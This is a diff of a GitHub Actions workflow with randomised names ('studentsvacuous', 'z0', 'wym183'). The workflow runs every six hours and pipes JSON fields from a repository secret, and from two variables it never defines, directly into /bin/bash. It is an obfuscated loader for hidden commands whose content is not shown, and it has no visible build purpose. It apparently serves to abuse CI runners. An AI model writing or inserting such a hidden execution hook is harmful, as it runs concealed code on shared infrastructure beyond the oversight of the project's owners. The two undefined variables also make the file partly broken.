@@ -1,19 +1,20 @@
 name: studentsvacuous
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '28 2/6 * * *'
+    - cron: '30 0/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: studentsvacuous
         env:
-          r9: ${{ secrets.r9 }}
+          z0: ${{ secrets.z0 }}
         run: |
-          echo $r9 | jq -r .hmzwo69623 | /bin/bash
-          echo $vvb5000 | jq -r .yfg118 | /bin/bash
-          echo $votyp8992 | jq -r .jvk296 | /bin/bash
+          echo $z0 | jq -r .wym183 | /bin/bash
+          echo $idc824 | jq -r .whx4755 | /bin/bash
+          echo $yl38278 | jq -r .zywu20854 | /bin/bash
 
